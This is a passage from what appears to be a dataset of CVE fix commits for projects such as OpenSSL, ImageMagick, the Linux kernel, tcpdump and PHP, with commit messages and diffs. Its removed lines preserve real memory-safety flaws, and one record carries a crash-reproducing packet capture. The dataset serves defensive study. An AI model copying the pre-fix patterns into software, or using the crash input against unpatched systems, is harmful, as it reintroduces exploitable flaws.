NULL)\n+\t\t\tOPENSSL_free(rdata->rbuf.buf);\n \t\tOPENSSL_free(rdata);\n \t\tpitem_free(item);\n-\t\treturn(0);\n+\t\treturn(-1);\n \t\t}\n \n \treturn(1);\n@@ -314,8 +318,9 @@ dtls1_process_buffered_records(SSL *s)\n             dtls1_get_unprocessed_record(s);\n             if ( ! dtls1_process_record(s))\n                 return(0);\n-            dtls1_buffer_record(s, &(s->d1->processed_rcds), \n-                s->s3->rrec.seq_num);\n+            if(dtls1_buffer_record(s, &(s->d1->processed_rcds),\n+                s->s3->rrec.seq_num)<0)\n+                return -1;\n             }\n         }\n \n@@ -529,7 +534,6 @@ printf(\"\\n\");\n \n \t/* we have pulled in a full packet so zero things */\n \ts->packet_length=0;\n-\tdtls1_record_bitmap_update(s, &(s->d1->bitmap));/* Mark receipt of record. */\n \treturn(1);\n \n f_err:\n@@ -563,7 +567,8 @@ int dtls1_get_record(SSL *s)\n \n \t/* The epoch may have changed.  If so, process all the\n \t * pending records.  This is a non-blocking operation. */\n-\tdtls1_process_buffered_records(s);\n+\tif(dtls1_process_buffered_records(s)<0)\n+\t\treturn -1;\n \n \t/* if we're renegotiating, then there may be buffered records */\n \tif (dtls1_get_processed_record(s))\n@@ -703,7 +708,9 @@ int dtls1_get_record(SSL *s)\n \t\t{\n \t\tif ((SSL_in_init(s) || s->in_handshake) && !s->d1->listen)\n \t\t\t{\n-\t\t\tdtls1_buffer_record(s, &(s->d1->unprocessed_rcds), rr->seq_num);\n+\t\t\tif(dtls1_buffer_record(s, &(s->d1->unprocessed_rcds), rr->seq_num)<0)\n+\t\t\t\treturn -1;\n+\t\t\tdtls1_record_bitmap_update(s, bitmap);/* Mark receipt of record. */\n \t\t\t}\n \t\trr->length = 0;\n \t\ts->packet_length = 0;\n@@ -716,6 +723,7 @@ int dtls1_get_record(SSL *s)\n \t\ts->packet_length = 0;  /* dump this record */\n \t\tgoto again;   /* get another record */\n \t\t}\n+\tdtls1_record_bitmap_update(s, bitmap);/* Mark receipt of record. */\n \n \treturn(1);\n \n@@ -869,7 +877,11 @@ int dtls1_read_bytes(SSL *s, int type, unsigned char *buf, int len, int peek)\n \t\t * buffer the application data for later processing rather\n \t\t * than dropping the connection.\n \t\t */\n-\t\tdtls1_buffer_record(s, &(s->d1->buffered_app_data), rr->seq_num);\n+\t\tif(dtls1_buffer_record(s, &(s->d1->buffered_app_data), rr->seq_num)<0)\n+\t\t\t{\n+\t\t\tSSLerr(SSL_F_DTLS1_READ_BYTES, ERR_R_INTERNAL_ERROR);\n+\t\t\treturn -1;\n+\t\t\t}\n \t\trr->length = 0;\n \t\tgoto start;\n \t\t}\n", "owner": "openssl", "repo": "openssl", "source": "cve"}
{"CVE_ID": "CVE-2019-13134", "CWE_ID": "399", "category": "security", "commit_id": "fe3066122ef72c82415811d25e9e3fad622c0a99", "commit_message": "From fe3066122ef72c82415811d25e9e3fad622c0a99 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Tue, 18 Jun 2019 11:51:46 -0400\nSubject: [PATCH] https://github.com/ImageMagick/ImageMagick/issues/1600\n\n---\n coders/bmp.c  | 2 +-\n coders/viff.c | 4 ++--\n 2 files changed, 3 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/coders/bmp.c b/coders/bmp.c\nindex fdabac9502..c964834fe8 100644\n--- a/coders/bmp.c\n+++ b/coders/bmp.c\n@@ -1506,7 +1506,7 @@ static Image *ReadBMPImage(const ImageInfo *image_info,ExceptionInfo *exception)\n         if (GetNextImageInList(image) == (Image *) NULL)\n           {\n             status=MagickFalse;\n-            return((Image *) NULL);\n+            break;\n           }\n         image=SyncNextImageInList(image);\n         status=SetImageProgress(image,LoadImagesTag,TellBlob(image),\ndiff --git a/coders/viff.c b/coders/viff.c\nindex 5f89ad15e3..05aac7c556 100644\n--- a/coders/viff.c\n+++ b/coders/viff.c\n@@ -773,8 +773,8 @@ static Image *ReadVIFFImage(const ImageInfo *image_info,\n         AcquireNextImage(image_info,image,exception);\n         if (GetNextImageInList(image) == (Image *) NULL)\n           {\n-            image=DestroyImageList(image);\n-            return((Image *) NULL);\n+            status=MagickFalse;\n+            break;\n           }\n         image=SyncNextImageInList(image);\n         status=SetImageProgress(image,LoadImagesTag,TellBlob(image),\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2019-11487", "CWE_ID": "416", "category": "security", "commit_id": "88b1a17dfc3ed7728316478fae0f5ad508f50397", "commit_message": "From 88b1a17dfc3ed7728316478fae0f5ad508f50397 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Thu, 11 Apr 2019 10:14:59 -0700\nSubject: mm: add 'try_get_page()' helper function\n\nThis is the same as the traditional 'get_page()' function, but instead\nof unconditionally incrementing the reference count of the page, it only\ndoes so if the count was \"safe\".  It returns whether the reference count\nwas incremented (and is marked __must_check, since the caller obviously\nhas to be aware of it).\n\nAlso like 'get_page()', you can't use this function unless you already\nhad a reference to the page.  The intent is that you can use this\nexactly like get_page(), but in situations where you want to limit the\nmaximum reference count.\n\nThe code currently does an unconditional WARN_ON_ONCE() if we ever hit\nthe reference count issues (either zero or negative), as a notification\nthat the conditional non-increment actually happened.\n\nNOTE! The count access for the \"safety\" check is inherently racy, but\nthat doesn't matter since the buffer we use is basically half the range\nof the reference count (ie we look at the sign of the count).\n\nAcked-by: Matthew Wilcox <willy@infradead.org>\nCc: Jann Horn <jannh@google.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n include/linux/mm.h | 9 +++++++++\n 1 file changed, 9 insertions(+)\n\n", "diff_code": "diff --git a/include/linux/mm.h b/include/linux/mm.h\nindex 541d99b86aea..7000ddd807e0 100644\n--- a/include/linux/mm.h\n+++ b/include/linux/mm.h\n@@ -980,6 +980,15 @@ static inline void get_page(struct page *page)\n \tpage_ref_inc(page);\n }\n \n+static inline __must_check bool try_get_page(struct page *page)\n+{\n+\tpage = compound_head(page);\n+\tif (WARN_ON_ONCE(page_ref_count(page) <= 0))\n+\t\treturn false;\n+\tpage_ref_inc(page);\n+\treturn true;\n+}\n+\n static inline void put_page(struct page *page)\n {\n \tpage = compound_head(page);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-13008", "CWE_ID": "119", "category": "security", "commit_id": "5edf405d7ed9fc92f4f43e8a3d44baa4c6387562", "commit_message": "From 5edf405d7ed9fc92f4f43e8a3d44baa4c6387562 Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Mon, 6 Mar 2017 09:42:49 -0800\nSubject: [PATCH] CVE-2017-13008/IEEE 802.11: Fix TIM bitmap copy to copy from\n p + offset.\n\noffset has already been advanced to point to the bitmap; we shouldn't\nadd the amount to advance again.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nWhile we're at it, remove some redundant tests - we've already checked,\nbefore the case statement, whether we have captured the entire\ninformation element and whether the entire information element is\npresent in the on-the-wire packet; in the cases for particular IEs, we\nonly need to make sure we don't go past the end of the IE.\n---\n print-802_11.c                   |  14 +-------------\n tests/TESTLIST                   |   1 +\n tests/ieee802.11_rates_oobr.out  |   1 +\n tests/ieee802.11_rates_oobr.pcap | Bin 0 -> 126 bytes\n 4 files changed, 3 insertions(+), 13 deletions(-)\n create mode 100644 tests/ieee802.11_rates_oobr.out\n create mode 100644 tests/ieee802.11_rates_oobr.pcap\n\n", "diff_code": "diff --git a/print-802_11.c b/print-802_11.c\nindex 17c1f70cb..d8bf039de 100644\n--- a/print-802_11.c\n+++ b/print-802_11.c\n@@ -1039,10 +1039,6 @@ parse_elements(netdissect_options *ndo,\n \t\t\tif (ssid.length != 0) {\n \t\t\t\tif (ssid.length > sizeof(ssid.ssid) - 1)\n \t\t\t\t\treturn 0;\n-\t\t\t\tif (!ND_TTEST2(*(p + offset), ssid.length))\n-\t\t\t\t\treturn 0;\n-\t\t\t\tif (length < ssid.length)\n-\t\t\t\t\treturn 0;\n \t\t\t\tmemcpy(&ssid.ssid, p + offset, ssid.length);\n \t\t\t\toffset += ssid.length;\n \t\t\t\tlength -= ssid.length;\n@@ -1068,10 +1064,6 @@ parse_elements(netdissect_options *ndo,\n \t\t\t\tif (challenge.length >\n \t\t\t\t    sizeof(challenge.text) - 1)\n \t\t\t\t\treturn 0;\n-\t\t\t\tif (!ND_TTEST2(*(p + offset), challenge.length))\n-\t\t\t\t\treturn 0;\n-\t\t\t\tif (length < challenge.length)\n-\t\t\t\t\treturn 0;\n \t\t\t\tmemcpy(&challenge.text, p + offset,\n \t\t\t\t    challenge.length);\n \t\t\t\toffset += challenge.length;\n@@ -1097,10 +1089,6 @@ parse_elements(netdissect_options *ndo,\n \t\t\tif (rates.length != 0) {\n \t\t\t\tif (rates.length > sizeof rates.rate)\n \t\t\t\t\treturn 0;\n-\t\t\t\tif (!ND_TTEST2(*(p + offset), rates.length))\n-\t\t\t\t\treturn 0;\n-\t\t\t\tif (length < rates.length)\n-\t\t\t\t\treturn 0;\n \t\t\t\tmemcpy(&rates.rate, p + offset, rates.length);\n \t\t\t\toffset += rates.length;\n \t\t\t\tlength -= rates.length;\n@@ -1189,7 +1177,7 @@ parse_elements(netdissect_options *ndo,\n \t\t\toffset += 3;\n \t\t\tlength -= 3;\n \n-\t\t\tmemcpy(tim.bitmap, p + offset + 3, tim.length - 3);\n+\t\t\tmemcpy(tim.bitmap, p + offset, tim.length - 3);\n \t\t\toffset += tim.length - 3;\n \t\t\tlength -= tim.length - 3;\n \t\t\t/*\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex 5f18a0574..17ee6fb73 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -438,6 +438,7 @@ ipv6-rthdr-oobr\t\tipv6-rthdr-oobr.pcap\t\tipv6-rthdr-oobr.out\n ieee802.11_tim_ie_oobr\tieee802.11_tim_ie_oobr.pcap\tieee802.11_tim_ie_oobr.out\n decnet-shorthdr-oobr\tdecnet-shorthdr-oobr.pcap\tdecnet-shorthdr-oobr.out\n isakmp-3948-oobr-2\tisakmp-3948-oobr-2.pcap\t\tisakmp-3948-oobr-2.out\n+ieee802.11_rates_oobr\tieee802.11_rates_oobr.pcap\tieee802.11_rates_oobr.out\n \n # bad packets from Kamil Frankowicz\n snmp-heapoverflow-1\tsnmp-heapoverflow-1.pcap\tsnmp-heapoverflow-1.out\ndiff --git a/tests/ieee802.11_rates_oobr.out b/tests/ieee802.11_rates_oobr.out\nnew file mode 100644\nindex 000000000..222eed335\n--- /dev/null\n+++ b/tests/ieee802.11_rates_oobr.out\n@@ -0,0 +1 @@\n+fhset 48 fhpat 48 48dBm signal 48dB signal 48dB noise [|802.11]Beacon IBSS, PRIVACY[|802.11]\ndiff --git a/tests/ieee802.11_rates_oobr.pcap b/tests/ieee802.11_rates_oobr.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..bb2819a8c04c245c86fc53e40c77f5de92129dab\nGIT binary patch\nliteral 126\nycmca|c+)~A1{MYbC~#+BV5nz+a}C0P{4lVb1VRv|7)UoFv2ijP4Om&QN&)~eXcxu+\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2013-4541", "CWE_ID": "119", "category": "security", "commit_id": "9f8e9895c504149d7048e9fc5eb5cbb34b16e49a", "commit_message": "From 9f8e9895c504149d7048e9fc5eb5cbb34b16e49a Mon Sep 17 00:00:00 2001\nFrom: \"Michael S. Tsirkin\" <mst@redhat.com>\nDate: Thu, 3 Apr 2014 19:52:25 +0300\nSubject: [PATCH] usb: sanity check setup_index+setup_len in post_load\n\nCVE-2013-4541\n\ns->setup_len and s->setup_index are fed into usb_packet_copy as\nsize/offset into s->data_buf, it's possible for invalid state to exploit\nthis to load arbitrary data.\n\nsetup_len and setup_index should be checked to make sure\nthey are not negative.\n\nCc: Gerd Hoffmann <kraxel@redhat.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nReviewed-by: Gerd Hoffmann <kraxel@redhat.com>\nSigned-off-by: Juan Quintela <quintela@redhat.com>\n---\n hw/usb/bus.c | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/hw/usb/bus.c b/hw/usb/bus.c\nindex fe70429..e48b19f 100644\n--- a/hw/usb/bus.c\n+++ b/hw/usb/bus.c\n@@ -49,7 +49,9 @@ static int usb_device_post_load(void *opaque, int version_id)\n     } else {\n         dev->attached = 1;\n     }\n-    if (dev->setup_index >= sizeof(dev->data_buf) ||\n+    if (dev->setup_index < 0 ||\n+        dev->setup_len < 0 ||\n+        dev->setup_index >= sizeof(dev->data_buf) ||\n         dev->setup_len >= sizeof(dev->data_buf)) {\n         return -EINVAL;\n     }\n-- \n1.8.3.1\n\n", "owner": "bonzini", "repo": "qemu", "source": "cve"}
{"CVE_ID": "CVE-2018-15858", "CWE_ID": "476", "category": "security", "commit_id": "badb428e63387140720f22486b3acbd3d738859f", "commit_message": "From badb428e63387140720f22486b3acbd3d738859f Mon Sep 17 00:00:00 2001\nFrom: Peter Hutterer <peter.hutterer@who-t.net>\nDate: Mon, 23 Jul 2018 11:48:35 +1000\nSubject: [PATCH] keycodes: don't try to copy zero key aliases\n\nMove the aliases copy to within the (num_key_aliases > 0) block.\n\nPassing info->aliases into this fuction with invalid aliases will\ncause log messages but num_key_aliases stays on 0. The key_aliases array\nis never allocated and remains NULL. We then loop through the aliases, causing\na null-pointer dereference.\n\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>\n---\n src/xkbcomp/keycodes.c | 14 +++++++-------\n 1 file changed, 7 insertions(+), 7 deletions(-)\n\n", "diff_code": "diff --git a/src/xkbcomp/keycodes.c b/src/xkbcomp/keycodes.c\nindex 7f5955e..491da51 100644\n--- a/src/xkbcomp/keycodes.c\n+++ b/src/xkbcomp/keycodes.c\n@@ -596,14 +596,14 @@ CopyKeyAliasesToKeymap(struct xkb_keymap *keymap, KeyNamesInfo *info)\n         key_aliases = calloc(num_key_aliases, sizeof(*key_aliases));\n         if (!key_aliases)\n             return false;\n-    }\n \n-    i = 0;\n-    darray_foreach(alias, info->aliases) {\n-        if (alias->real != XKB_ATOM_NONE) {\n-            key_aliases[i].alias = alias->alias;\n-            key_aliases[i].real = alias->real;\n-            i++;\n+        i = 0;\n+        darray_foreach(alias, info->aliases) {\n+            if (alias->real != XKB_ATOM_NONE) {\n+                key_aliases[i].alias = alias->alias;\n+                key_aliases[i].real = alias->real;\n+                i++;\n+            }\n         }\n     }\n \n", "owner": "xkbcommon", "repo": "libxkbcommon", "source": "cve"}
{"CVE_ID": "CVE-2012-2385", "CWE_ID": "399", "category": "security", "commit_id": "9791768705528e911bfca6c4d8aa88139035060e", "commit_message": "From 9791768705528e911bfca6c4d8aa88139035060e Mon Sep 17 00:00:00 2001\nFrom: Keith Winstein <keithw@mit.edu>\nDate: Tue, 15 May 2012 23:46:09 -0400\nSubject: [PATCH] Cap escape sequence parameters to prevent long loops.\n\nFixes #271 github issue.\n---\n src/terminal/terminaldispatcher.cc | 5 +++++\n src/terminal/terminaldispatcher.h  | 3 +++\n 2 files changed, 8 insertions(+)\n\n", "diff_code": "diff --git a/src/terminal/terminaldispatcher.cc b/src/terminal/terminaldispatcher.cc\nindex ae02bff3..de07b80d 100644\n--- a/src/terminal/terminaldispatcher.cc\n+++ b/src/terminal/terminaldispatcher.cc\n@@ -116,6 +116,11 @@ int Dispatcher::getparam( size_t N, int defaultval )\n   if ( parsed_params.size() > N ) {\n     ret = parsed_params[ N ];\n   }\n+\n+  if ( ret > PARAM_MAX ) {\n+    ret = defaultval;\n+  }\n+\n   if ( ret < 1 ) ret = defaultval;\n \n   return ret;\ndiff --git a/src/terminal/terminaldispatcher.h b/src/terminal/terminaldispatcher.h\nindex bdad3c1a..f5f801c1 100644\n--- a/src/terminal/terminaldispatcher.h\n+++ b/src/terminal/terminaldispatcher.h\n@@ -77,6 +77,9 @@ namespace Terminal {\n     void parse_params( void );\n \n   public:\n+    static const int PARAM_MAX = 65535;\n+    /* prevent evil escape sequences from causing long loops */\n+\n     std::string terminal_to_host; /* this is the reply string */\n \n     Dispatcher();\n", "owner": "keithw", "repo": "mosh", "source": "cve"}
{"CVE_ID": "CVE-2016-7101", "CWE_ID": "125", "category": "security", "commit_id": "8f8959033e4e59418d6506b345829af1f7a71127", "commit_message": "From 8f8959033e4e59418d6506b345829af1f7a71127 Mon Sep 17 00:00:00 2001\nFrom: Cristy <urban-warrior@imagemagick.org>\nDate: Thu, 18 Aug 2016 19:40:03 -0400\nSubject: [PATCH] ...\n\n---\n coders/sgi.c | 11 ++++++-----\n 1 file changed, 6 insertions(+), 5 deletions(-)\n\n", "diff_code": "diff --git a/coders/sgi.c b/coders/sgi.c\nindex 1fe65e604f..0ccd9c0313 100644\n--- a/coders/sgi.c\n+++ b/coders/sgi.c\n@@ -340,8 +340,10 @@ static Image *ReadSGIImage(const ImageInfo *image_info,ExceptionInfo *exception)\n     iris_info.minimum_value=ReadBlobMSBLong(image);\n     iris_info.maximum_value=ReadBlobMSBLong(image);\n     iris_info.sans=ReadBlobMSBLong(image);\n-    (void) ReadBlob(image,sizeof(iris_info.name),(unsigned char *)\n+    count=ReadBlob(image,sizeof(iris_info.name),(unsigned char *)\n       iris_info.name);\n+    if (count != sizeof(iris_info.name))\n+      ThrowReaderException(CorruptImageError,\"ImproperImageHeader\");\n     iris_info.name[sizeof(iris_info.name)-1]='\\0';\n     if (*iris_info.name != '\\0')\n       (void) SetImageProperty(image,\"label\",iris_info.name,exception);\n@@ -349,7 +351,8 @@ static Image *ReadSGIImage(const ImageInfo *image_info,ExceptionInfo *exception)\n     if (iris_info.pixel_format != 0)\n       ThrowReaderException(CorruptImageError,\"ImproperImageHeader\");\n     count=ReadBlob(image,sizeof(iris_info.filler),iris_info.filler);\n-    (void) count;\n+    if (count != sizeof(iris_info.filler))\n+      ThrowReaderException(CorruptImageError,\"ImproperImageHeader\");\n     image->columns=iris_info.columns;\n     image->rows=iris_info.rows;\n     image->depth=(size_t) MagickMin(iris_info.depth,MAGICKCORE_QUANTUM_DEPTH);\n@@ -361,9 +364,7 @@ static Image *ReadSGIImage(const ImageInfo *image_info,ExceptionInfo *exception)\n         image->storage_class=PseudoClass;\n         image->colors=iris_info.bytes_per_pixel > 1 ? 65535 : 256;\n       }\n-    if (EOFBlob(image) != MagickFalse)\n-      ThrowReaderException(CorruptImageError,\"ImproperImageHeader\");\n-    if ((image_info->ping != MagickFalse)  && (image_info->number_scenes != 0))\n+    if ((image_info->ping != MagickFalse) && (image_info->number_scenes != 0))\n       if (image->scene >= (image_info->scene+image_info->number_scenes-1))\n         break;\n     status=SetImageExtent(image,image->columns,image->rows,exception);\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2017-8067", "CWE_ID": "119", "category": "security", "commit_id": "c4baad50297d84bde1a7ad45e50c73adae4a2192", "commit_message": "From c4baad50297d84bde1a7ad45e50c73adae4a2192 Mon Sep 17 00:00:00 2001\nFrom: Omar Sandoval <osandov@fb.com>\nDate: Wed, 1 Feb 2017 00:02:27 -0800\nSubject: [PATCH] virtio-console: avoid DMA from stack\n\nput_chars() stuffs the buffer it gets into an sg, but that buffer may be\non the stack. This breaks with CONFIG_VMAP_STACK=y (for me, it\nmanifested as printks getting turned into NUL bytes).\n\nSigned-off-by: Omar Sandoval <osandov@fb.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nReviewed-by: Amit Shah <amit.shah@redhat.com>\n---\n drivers/char/virtio_console.c | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/drivers/char/virtio_console.c b/drivers/char/virtio_console.c\nindex 6266c0568e1d0..e9b7e0b3cabe6 100644\n--- a/drivers/char/virtio_console.c\n+++ b/drivers/char/virtio_console.c\n@@ -1136,6 +1136,8 @@ static int put_chars(u32 vtermno, const char *buf, int count)\n {\n \tstruct port *port;\n \tstruct scatterlist sg[1];\n+\tvoid *data;\n+\tint ret;\n \n \tif (unlikely(early_put_chars))\n \t\treturn early_put_chars(vtermno, buf, count);\n@@ -1144,8 +1146,14 @@ static int put_chars(u32 vtermno, const char *buf, int count)\n \tif (!port)\n \t\treturn -EPIPE;\n \n-\tsg_init_one(sg, buf, count);\n-\treturn __send_to_port(port, sg, 1, count, (void *)buf, false);\n+\tdata = kmemdup(buf, count, GFP_ATOMIC);\n+\tif (!data)\n+\t\treturn -ENOMEM;\n+\n+\tsg_init_one(sg, data, count);\n+\tret = __send_to_port(port, sg, 1, count, data, false);\n+\tkfree(data);\n+\treturn ret;\n }\n \n /*\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-13406", "CWE_ID": "190", "category": "security", "commit_id": "9f645bcc566a1e9f921bdae7528a01ced5bc3713", "commit_message": "From 9f645bcc566a1e9f921bdae7528a01ced5bc3713 Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Fri, 11 May 2018 18:24:12 +1000\nSubject: video: uvesafb: Fix integer overflow in allocation\n\ncmap->len can get close to INT_MAX/2, allowing for an integer overflow in\nallocation. This uses kmalloc_array() instead to catch the condition.\n\nReported-by: Dr Silvio Cesare of InfoSect <silvio.cesare@gmail.com>\nFixes: 8bdb3a2d7df48 (\"uvesafb: the driver core\")\nCc: stable@vger.kernel.org\nSigned-off-by: Kees Cook <keescook@chromium.org>\n---\n drivers/video/fbdev/uvesafb.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/drivers/video/fbdev/uvesafb.c b/drivers/video/fbdev/uvesafb.c\nindex 73676eb0244a..c592ca513115 100644\n--- a/drivers/video/fbdev/uvesafb.c\n+++ b/drivers/video/fbdev/uvesafb.c\n@@ -1044,7 +1044,8 @@ static int uvesafb_setcmap(struct fb_cmap *cmap, struct fb_info *info)\n \t\t    info->cmap.len || cmap->start < info->cmap.start)\n \t\t\treturn -EINVAL;\n \n-\t\tentries = kmalloc(sizeof(*entries) * cmap->len, GFP_KERNEL);\n+\t\tentries = kmalloc_array(cmap->len, sizeof(*entries),\n+\t\t\t\t\tGFP_KERNEL);\n \t\tif (!entries)\n \t\t\treturn -ENOMEM;\n \n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-9201", "CWE_ID": "369", "category": "security", "commit_id": "dc49c807926b96e503bd7c0dec35119eecd6c6fe", "commit_message": "From dc49c807926b96e503bd7c0dec35119eecd6c6fe Mon Sep 17 00:00:00 2001\nFrom: Jason Summers <jason1@pobox.com>\nDate: Mon, 15 May 2017 13:27:08 -0400\nSubject: [PATCH] Double-check that the input image's density is valid\n\nFixes a bug that could result in division by zero, at least for a JPEG\nsource image.\nFixes issues #19, #20\n---\n src/imagew-api.c | 19 +++++++++++++------\n 1 file changed, 13 insertions(+), 6 deletions(-)\n\n", "diff_code": "diff --git a/src/imagew-api.c b/src/imagew-api.c\nindex 3953731..80531ab 100644\n--- a/src/imagew-api.c\n+++ b/src/imagew-api.c\n@@ -483,13 +483,20 @@ IW_IMPL(int) iw_get_input_density(struct iw_context *ctx,\n {\n \t*px = 1.0;\n \t*py = 1.0;\n-\t*pcode = ctx->img1.density_code;\n-\tif(ctx->img1.density_code!=IW_DENSITY_UNKNOWN) {\n-\t\t*px = ctx->img1.density_x;\n-\t\t*py = ctx->img1.density_y;\n-\t\treturn 1;\n+\t*pcode = IW_DENSITY_UNKNOWN;\n+\n+\tif(ctx->img1.density_code==IW_DENSITY_UNKNOWN) {\n+\t\treturn 0;\n \t}\n-\treturn 0;\n+\tif(!iw_is_valid_density(ctx->img1.density_x, ctx->img1.density_y,\n+\t\tctx->img1.density_code))\n+\t{\n+\t\treturn 0;\n+\t}\n+\t*px = ctx->img1.density_x;\n+\t*py = ctx->img1.density_y;\n+\t*pcode = ctx->img1.density_code;\n+\treturn 1;\n }\n \n IW_IMPL(void) iw_set_output_density(struct iw_context *ctx,\n", "owner": "jsummers", "repo": "imageworsener", "source": "cve"}
{"CVE_ID": "CVE-2015-5221", "CWE_ID": "416", "category": "security", "commit_id": "df5d2867e8004e51e18b89865bc4aa69229227b3", "commit_message": "From df5d2867e8004e51e18b89865bc4aa69229227b3 Mon Sep 17 00:00:00 2001\nFrom: Richard Hughes <richard@hughsie.com>\nDate: Mon, 19 Sep 2016 10:03:36 +0100\nSubject: [PATCH] CVE-2015-5221\n\n---\n src/libjasper/mif/mif_cod.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/libjasper/mif/mif_cod.c b/src/libjasper/mif/mif_cod.c\nindex 17506a1..5afc0a2 100644\n--- a/src/libjasper/mif/mif_cod.c\n+++ b/src/libjasper/mif/mif_cod.c\n@@ -570,13 +570,13 @@ static int mif_process_cmpt(mif_hdr_t *hdr, char *buf)\n \t\t\tbreak;\n \t\t}\n \t}\n-\tjas_tvparser_destroy(tvp);\n \tif (!cmpt->sampperx || !cmpt->samppery) {\n \t\tgoto error;\n \t}\n \tif (mif_hdr_addcmpt(hdr, hdr->numcmpts, cmpt)) {\n \t\tgoto error;\n \t}\n+\tjas_tvparser_destroy(tvp);\n \treturn 0;\n \n error:\n", "owner": "mdadams", "repo": "jasper", "source": "cve"}
{"CVE_ID": "CVE-2016-1904", "CWE_ID": "189", "category": "security", "commit_id": "2871c70efaaaa0f102557a17c727fd4d5204dd4b", "commit_message": "From 2871c70efaaaa0f102557a17c727fd4d5204dd4b Mon Sep 17 00:00:00 2001\nFrom: libnex <emmanuel.law@gmail.com>\nDate: Mon, 4 Jan 2016 12:27:27 +1300\nSubject: [PATCH] Patch for Heap Buffer Overflow in EscapeShell\n\nProposed patch for bug #71270\n---\n ext/standard/exec.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/ext/standard/exec.c b/ext/standard/exec.c\nindex c724b795357a..c4afce333735 100644\n--- a/ext/standard/exec.c\n+++ b/ext/standard/exec.c\n@@ -253,7 +253,7 @@ PHPAPI zend_string *php_escape_shell_cmd(char *str)\n #endif\n \n \n-\tcmd = zend_string_alloc(2 * l, 0);\n+\tcmd = zend_string_safe_alloc(2, l, 0, 0);\n \n \tfor (x = 0, y = 0; x < l; x++) {\n \t\tint mb_len = php_mblen(str + x, (l - x));\n@@ -345,7 +345,7 @@ PHPAPI zend_string *php_escape_shell_arg(char *str)\n \tsize_t estimate = (4 * l) + 3;\n \n \n-\tcmd = zend_string_alloc(4 * l + 2, 0); /* worst case */\n+\tcmd = zend_string_safe_alloc(4, l, 2, 0); /* worst case */\n \n #ifdef PHP_WIN32\n \tZSTR_VAL(cmd)[y++] = '\"';\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2010-0291", "CWE_ID": "264", "category": "security", "commit_id": "e77414e0aad6a1b063ba5e5750c582c75327ea6a", "commit_message": "From e77414e0aad6a1b063ba5e5750c582c75327ea6a Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Sat, 5 Dec 2009 15:10:44 -0500\nSubject: fix broken aliasing checks for MAP_FIXED on sparc32, mips, arm and sh\n\nWe want addr - (pgoff << PAGE_SHIFT) consistently coloured...\n\nAcked-by: Paul Mundt <lethal@linux-sh.org>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch/arm/mm/mmap.c               | 3 ++-\n arch/mips/kernel/syscall.c       | 3 ++-\n arch/sh/mm/mmap.c                | 3 ++-\n arch/sparc/kernel/sys_sparc_32.c | 3 ++-\n 4 files changed, 8 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/arch/arm/mm/mmap.c b/arch/arm/mm/mmap.c\nindex 2b7996401b0f..f5abc51c5a07 100644\n--- a/arch/arm/mm/mmap.c\n+++ b/arch/arm/mm/mmap.c\n@@ -54,7 +54,8 @@ arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t * We enforce the MAP_FIXED case.\n \t */\n \tif (flags & MAP_FIXED) {\n-\t\tif (aliasing && flags & MAP_SHARED && addr & (SHMLBA - 1))\n+\t\tif (aliasing && flags & MAP_SHARED &&\n+\t\t    (addr - (pgoff << PAGE_SHIFT)) & (SHMLBA - 1))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a/arch/mips/kernel/syscall.c b/arch/mips/kernel/syscall.c\nindex c25b2e7dcb7b..3f7f466190b4 100644\n--- a/arch/mips/kernel/syscall.c\n+++ b/arch/mips/kernel/syscall.c\n@@ -93,7 +93,8 @@ unsigned long arch_get_unmapped_area(struct file *filp, unsigned long addr,\n \t\t * We do not accept a shared mapping if it would violate\n \t\t * cache aliasing constraints.\n \t\t */\n-\t\tif ((flags & MAP_SHARED) && (addr & shm_align_mask))\n+\t\tif ((flags & MAP_SHARED) &&\n+\t\t    ((addr - (pgoff << PAGE_SHIFT)) & shm_align_mask))\n \t\t\treturn -EINVAL;\n \t\treturn addr;\n \t}\ndiff --git a/arch/sh/mm/mmap.c b/arch/sh/mm/mmap.c\nindex d2984fa42d3d..afeb710ec5c3 100644\n--- 